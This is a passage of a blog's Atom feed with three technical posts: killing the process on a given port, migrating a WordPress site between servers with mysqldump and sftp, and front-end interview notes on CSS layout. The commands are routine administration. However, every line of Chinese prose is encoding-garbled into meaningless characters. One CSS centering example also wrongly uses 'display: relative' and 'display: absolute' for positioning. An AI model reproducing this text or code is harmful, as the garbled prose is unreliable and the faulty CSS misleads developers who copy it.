  </entry>
  
  <entry>
    <title>æ€æ‰å ç”¨æŸä¸ªç«¯å£çš„è¿›ç¨‹</title>
    <link href="http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/"/>
    <id>http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/</id>
    <published>2016-01-16T10:16:08.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -lntu</div><div class="line">lsof -i:[PORT]</div><div class="line"><span class="built_in">kill</span> [PID]</div></pre></td></tr></table></figure><h4 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h4><ul><li><a href="http://superuser.com/questions/529830/get-a-list-of-open-ports-in-linux" target="_blank" rel="external">Get a list of Open Ports in Linux</a></li><li><a href="http://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux" target="_blank" rel="external">How to kill a process running on particular port in Linux?</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ“ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;l
      
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>åœ¨æœåŠ¡å™¨é—´è¿ç§» wordpress</title>
    <link href="http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/"/>
    <id>http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/</id>
    <published>2015-10-26T02:04:04.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å°è¯•æŠŠåšå®¢ä» SAE è¿åˆ°é˜¿é‡Œäº‘ï¼Œè¿‡ç¨‹æœ‰äº›å°ç£•ç¢°ï¼Œä¸è¿‡è¿˜æ˜¯æˆåŠŸäº†ï¼Œè®°å½•ä¸‹ã€‚</p><h4 id="è¿ç§»æ•°æ®åº“"><a href="#è¿ç§»æ•°æ®åº“" class="headerlink" title="è¿ç§»æ•°æ®åº“"></a>è¿ç§»æ•°æ®åº“</h4><p>SAE æ•°æ®åº“æ˜¯ MySQLï¼Œç”±äºæˆ‘æ•°æ®è¿‡äºåºå¤§ï¼Œä¸èƒ½é€šè¿‡ phpMyAdmin å¯¼å‡ºï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨äº† SAE çš„ <a href="http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob" target="_blank" rel="external">DeferredJob</a> åŠŸèƒ½è¿›è¡Œæ•°æ®åº“å¯¼å‡ºã€‚ <a id="more"></a></p><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯è‡ªå·±çš„æ•°æ®åº“å¯¼å‡ºå°±ç®€å•å¤šäº†ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqldump -u USERNAME -p DATABASE_NAME &gt; OUTPUT.sql</div></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>gzip</code> å‹ç¼©ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqldump -u USERNAME -p DATABASE_NAME | gzip &gt; OUTPUT.sql.gz</div></pre></td></tr></table></figure><p>å¯¼å‡ºåä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæˆ‘ç”¨çš„æ˜¯ <a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="external">sftp</a> ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sftp username@host</div><div class="line">put saeOutput.sql</div></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®æ ‡æœåŠ¡å™¨ MySQL å¯¼å…¥ï¼Œä¸è¿‡å¾—å…ˆåœ¨ MySQL å‘½ä»¤ç•Œé¢åˆ›å»ºä¸ªæ•°æ®åº“æ¥ä¿å­˜è¿™ä»½æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> wp;</div></pre></td></tr></table></figure><p>æœ€åå¯¼å…¥æ•°æ®ï¼Œè¿™æ˜¯åœ¨ <code>sh</code> ç•Œé¢ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -u USERNAME -p TARGET_DATABASE_NAME &lt; saeOutput.sql</div></pre></td></tr></table></figure><h4 id="è¿ç§»-wordpress-æ–‡ä»¶"><a href="#è¿ç§»-wordpress-æ–‡ä»¶" class="headerlink" title="è¿ç§» wordpress æ–‡ä»¶"></a>è¿ç§» wordpress æ–‡ä»¶</h4><p>æŠŠæ•´ä¸ª wordpress æ–‡ä»¶å¤¹å¤åˆ¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œåœ¨ <code>wp-config.php</code> ä¿®æ”¹ä¸‹æ•°æ®åº“é…ç½®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'DB_NAME'</span>, MYSQL_DB);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL database username */</span></div><div class="line">define(<span class="string">'DB_USER'</span>, MYSQL_USER);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL database password */</span></div><div class="line">define(<span class="string">'DB_PASSWORD'</span>, MYSQL_PASS);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL hostname */</span></div><div class="line">define(<span class="string">'DB_HOST'</span>, MYSQL_HOST_M.<span class="string">':'</span>.MYSQL_PORT);</div></pre></td></tr></table></figure><h4 id="æ”¹-URL"><a href="#æ”¹-URL" class="headerlink" title="æ”¹ URL"></a>æ”¹ URL</h4><p>éœ€è¦æ”¹åŸŸåçš„è¯åœ¨å½“å‰ä¸»é¢˜çš„ <code>functions.php</code> ä¸‹æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">update_option(<span class="string">'siteurl'</span>,<span class="string">'http://foo.bar'</span>);</div><div class="line">update_option(<span class="string">'home'</span>,<span class="string">'http://foo.bar'</span>);</div></pre></td></tr></table></figure><p>ç„¶åè®¿é—®è¯¥ wordpress ç›®å½•åœ¨æœåŠ¡å™¨çš„è·¯å¾„å³å¯æˆåŠŸæ”¹åŸŸåï¼Œä¹‹åå°±å¯ä»¥æŠŠä»¥ä¸Šä»£ç åˆ æ‰äº†ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/" target="_blank" rel="external">http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æˆ‘å°è¯•æŠŠåšå®¢ä» SAE è¿åˆ°é˜¿é‡Œäº‘ï¼Œè¿‡ç¨‹æœ‰äº›å°ç£•ç¢°ï¼Œä¸è¿‡è¿˜æ˜¯æˆåŠŸäº†ï¼Œè®°å½•ä¸‹ã€‚&lt;/p&gt;
&lt;h4 id=&quot;è¿ç§»æ•°æ®åº“&quot;&gt;&lt;a href=&quot;#è¿ç§»æ•°æ®åº“&quot; class=&quot;headerlink&quot; title=&quot;è¿ç§»æ•°æ®åº“&quot;&gt;&lt;/a&gt;è¿ç§»æ•°æ®åº“&lt;/h4&gt;&lt;p&gt;SAE æ•°æ®åº“æ˜¯ MySQLï¼Œç”±äºæˆ‘æ•°æ®è¿‡äºåºå¤§ï¼Œä¸èƒ½é€šè¿‡ phpMyAdmin å¯¼å‡ºï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨äº† SAE çš„ &lt;a href=&quot;http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DeferredJob&lt;/a&gt; åŠŸèƒ½è¿›è¡Œæ•°æ®åº“å¯¼å‡ºã€‚
    
    </summary>
    
      <category term="PHP" scheme="http://youngdze.co/categories/PHP/"/>
    
    
      <category term="wordpress" scheme="http://youngdze.co/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘é‡åˆ°çš„å‰ç«¯é¢è¯•é—®é¢˜</title>
    <link href="http://youngdze.co/2015/10/23/front-end-interview-q-a/"/>
    <id>http://youngdze.co/2015/10/23/front-end-interview-q-a/</id>
    <published>2015-10-22T16:26:41.000Z</published>
    <updated>2017-08-13T11:06:29.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ¸…é™¤æµ®åŠ¨"><a href="#æ¸…é™¤æµ®åŠ¨" class="headerlink" title="æ¸…é™¤æµ®åŠ¨"></a>æ¸…é™¤æµ®åŠ¨</h4><h5 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* æ”¾åœ¨æµ®åŠ¨å…ƒç´ ä¹‹åæ¸…é™¤æµ®åŠ¨ */</span></div><div class="line"><span class="selector-class">.clear</span> &#123;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><h5 id="æ„é€ -BFC"><a href="#æ„é€ -BFC" class="headerlink" title="æ„é€  BFC"></a>æ„é€  BFC</h5><p>æœ‰å…³ BFC çš„çŸ¥è¯†åœ¨ä¸‹é¢æœ‰è¯´ï¼Œ<code>overflow</code> ä¸ä¸º <code>visible</code> å¯æ„é€ ä¸€ä¸ª BFCã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="clearfix"><a href="#clearfix" class="headerlink" title="clearfix"></a>clearfix</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clearfix</span> &#123;</div><div class="line">    &amp;:before,</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">        <span class="attribute">display</span>: table;</div><div class="line">    &#125;</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">clear</span>: both;</div><div class="line">    &#125;</div><div class="line">    zoom: <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­"><a href="#åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­" class="headerlink" title="åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­"></a>åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­</h4><p>ç»™æµ®åŠ¨å±‚åŒ…å«ä¸ª <code>div</code>ï¼Œç”±äº <code>inline-block</code> ç›´æ¥ä¼šäº§ç”Ÿç©ºéš™ï¼Œæ¶ˆé™¤æ³•çœ‹ä¸‹é¢ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">    &amp;&gt;<span class="selector-tag">div</span> &#123;</div><div class="line">        <span class="attribute">display</span>: inline-block;</div><div class="line">        <span class="attribute">vertical-align</span>: middle;</div><div class="line">        <span class="selector-class">.left</span> &#123;</div><div class="line">            <span class="attribute">float</span>: left;</div><div class="line">        &#125;</div><div class="line">        <span class="selector-class">.right</span> &#123;</div><div class="line">            <span class="attribute">float</span>: right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>æ”¹ä¸º <code>table</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">display</span>: table-row;</div><div class="line">    <span class="selector-class">.left</span>,</div><div class="line">    <span class="selector-class">.right</span> &#123;</div><div class="line">        <span class="attribute">display</span>: table-cell;</div><div class="line">        <span class="attribute">vertical-align</span>: middle;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights" target="_blank" rel="external">http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights</a></li><li><a href="http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block" target="_blank" rel="external">http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block</a></li></ul><h4 id="å…ƒç´ åŒè¡Œæ’åˆ—"><a href="#å…ƒç´ åŒè¡Œæ’åˆ—" class="headerlink" title="å…ƒç´ åŒè¡Œæ’åˆ—"></a>å…ƒç´ åŒè¡Œæ’åˆ—</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>display: inline-block;</code>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.box</span> &#123;</div><div class="line">    <span class="attribute">display</span>: inline-block;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>å»æ‰ <code>inline-block</code> é—´çš„ç©ºæ ¼æ–¹æ³•1ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>å»æ‰ <code>inline-block</code> é—´çš„ç©ºæ ¼æ–¹æ³•2ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</div><div class="line">    <span class="selector-class">.box</span> &#123;</div><div class="line">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>float</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    &amp;:before,</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">display</span>: table;</div><div class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line">    &amp;:after &#123;</div><div class="line">        <span class="attribute">clear</span>: both;</div><div class="line">    &#125;</div><div class="line">    <span class="selector-class">.box</span> &#123;</div><div class="line">        <span class="attribute">float</span>: left;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>flexbox</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨-table-å¸ƒå±€ï¼š"><a href="#ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨-table-å¸ƒå±€ï¼š" class="headerlink" title="ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨ table å¸ƒå±€ï¼š"></a>ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨ <code>table</code> å¸ƒå±€ï¼š</h4><ol><li>å ç”¨å­—èŠ‚å¤ªå¤šï¼Œä¸‹è½½æ…¢</li><li>ä¼šå µå¡é¡µé¢æ¸²æŸ“</li><li>å¯èƒ½å¾—æŠŠå•ä¸ªã€æœ‰é€»è¾‘çš„å›¾ç‰‡åˆ‡æˆåˆ†æ•£çš„å°ä¸ª</li><li>åœ¨æŸäº›æµè§ˆå™¨ä¸Šå¯¼è‡´å¤åˆ¶æ–‡å­—å¾ˆè¯¡å¼‚ï¼Œç”¨æˆ·ä½“éªŒå·®</li><li>ä¸€äº›æ ·å¼ä¼šä¸èµ·ä½œç”¨ (<code>td { height: 100%; }</code>)</li><li>ä½¿ç”¨æ ·å¼æ—¶éå¸¸éš¾ä»¥ä¼˜åŒ–</li><li>ä½œç”¨æ˜¯å±•ç¤ºï¼Œä¸æ˜¯å†…å®¹ï¼Œä»è¯­ä¹‰ä¸Šçœ‹æ˜¯ä¸æ­£ç¡®çš„</li><li>ä¸€æ—¦å†™å¥½ï¼Œå¾ˆéš¾ç”¨ <code>CSS</code> æ”¹å˜å®ƒã€‚</li></ol><h4 id="CSS-å‚ç›´å±…ä¸­"><a href="#CSS-å‚ç›´å±…ä¸­" class="headerlink" title="CSS å‚ç›´å±…ä¸­"></a>CSS å‚ç›´å±…ä¸­</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>table</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: table-cell;</div><div class="line">    <span class="attribute">vertical-align</span>: middle;</div><div class="line">    <span class="attribute">text-align</span>: center;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">display</span>: inline-block;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>transform</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: relative;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">display</span>: absolute;</div><div class="line">        <span class="attribute">top</span>: <span class="number">50%</span>;</div><div class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</div><div class="line">        <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>flexbox</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.wrapper</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">    <span class="attribute">justify-content</span>: center;</div><div class="line">    <span class="selector-class">.inner</span> &#123;</div><div class="line">        <span class="attribute">align-self</span>: center;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>é€‚ç”¨ <code>absolute</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.Absolute-Center</span> &#123;</div><div class="line">    <span class="attribute">margin</span>: auto;</div><div class="line">    <span class="attribute">position</span>: absolute;</div><div class="line">    <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨å†…æ ¸"><a href="#æµè§ˆå™¨å†…æ ¸" class="headerlink" title="æµè§ˆå™¨å†…æ ¸"></a>æµè§ˆå™¨å†…æ ¸</h4><ul><li>Blink â€“ Chrome</li><li>Trident â€“ Internet Explorer</li><li>Gecko â€“ Firfox</li><li>Webkit â€“ Safari</li><li>Presto â€“ Opera</li><li>Others</li></ul><h4 id="CSS-ç›’å­æ¨¡å‹"><a href="#CSS-ç›’å­æ¨¡å‹" class="headerlink" title="CSS ç›’å­æ¨¡å‹"></a>CSS ç›’å­æ¨¡å‹</h4><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/W3C_and_Internet_Explorer_box_models.svg/320px-W3C_and_Internet_Explorer_box_models.svg.png?1445751206628" alt="CSS Box"></p><h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h4><p><strong>BFC</strong> å…¨ç§° Block Formatting Contextï¼Œå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œæ˜¯ç½‘é¡µä¸­ <strong>CSS</strong> æ¸²æŸ“çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ¸²æŸ“å®¹å™¨ï¼Œå…¶å†…éƒ¨å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–éƒ¨å…ƒç´ ã€‚</p><h5 id="å½¢æˆæ¡ä»¶"><a href="#å½¢æˆæ¡ä»¶" class="headerlink" title="å½¢æˆæ¡ä»¶"></a>å½¢æˆæ¡ä»¶</h5><ul><li>è¢«æ ¹å…ƒç´ æ‰€åŒ…å«</li><li><code>float</code> ä¸ä¸º <code>none</code></li><li>ç»å¯¹å®šä½å…ƒç´ ï¼ŒåŒ…æ‹¬ <code>absolute</code> å’Œ <code>fixed</code></li><li>å—çŠ¶åŒ…è£¹ï¼Œæ¯”å¦‚ <code>display</code> ä¸º <code>inline-block</code>, <code>table-cell</code>, <code>table-caption</code>, <code>flex</code>, <code>inline-flex</code></li><li><code>overflow</code> ä¸ä¸º <code>visible</code></li></ul><h5 id="å¸ƒå±€"><a href="#å¸ƒå±€" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h5><ul><li>åœ¨ <strong>BFC</strong> å†…éƒ¨ï¼Œå„ä¸ª Box ä¸€ä¸ªä¸ªå‚ç›´æ”¾ç½®ï¼Œç”± <strong>BFC</strong> çš„å¤´éƒ¨å¼€å§‹</li><li>ç›¸é‚»ä¹‹é—´ Box çš„è·ç¦»ç”± `margin å†³å®šï¼ŒåŒä¸€ä¸ª <strong>BFC</strong> å†…çš„ç›¸é‚» Box ä¹‹é—´ä¼šå‘ç”Ÿ <a href="http://www.w3.org/TR/CSS21/box.html#collapsing-margins" target="_blank" rel="external">margin collapsing</a></li><li>æ¯ä¸ª Box å¤–è¾¹ç•Œ(margin) éƒ½å’Œ <strong>BFC</strong> å·¦è¾¹ç•Œç›¸æ¥è§¦(å¯¹äºä»å³åˆ°å·¦æ ¼å¼åŒ–ï¼Œåˆ™æ¥è§¦å³è¾¹ç•Œ)ï¼Œæµ®åŠ¨å…ƒç´ åŒæ ·ï¼Œé™¤éå†…éƒ¨ float Box åˆåˆ›å»ºä¸€ä¸ªæ–°çš„ <strong>BFC</strong></li><li><strong>BFC</strong> æ˜¯ä¸€ä¸ªéš”ç¦»çš„ç‹¬ç«‹å®¹å™¨ï¼Œå…¶å†…éƒ¨å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–éƒ¨å…ƒç´ </li><li>è®¡ç®— <strong>BFC</strong> çš„é«˜åº¦æ—¶ï¼Œæµ®åŠ¨å…ƒç´ ä¹Ÿå‚ä¸è®¡ç®—</li></ul><h5 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://www.w3.org/TR/CSS21/visuren.html#block-formatting" target="_blank" rel="external">http://www.w3.org/TR/CSS21/visuren.html#block-formatting</a></li><li><a href="http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html" target="_blank" rel="external">http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html</a></li><li><a href="http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html" target="_blank" rel="external">http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context</a></li></ul><h4 id="Number-1-å’Œ-new-Number-1-çš„åŒºåˆ«"><a href="#Number-1-å’Œ-new-Number-1-çš„åŒºåˆ«" class="headerlink" title="Number(1) å’Œ new Number(1) çš„åŒºåˆ«"></a>Number(1) å’Œ new Number(1) çš„åŒºåˆ«</h4><p><code>1</code> å’Œ <code>Number(1)</code> 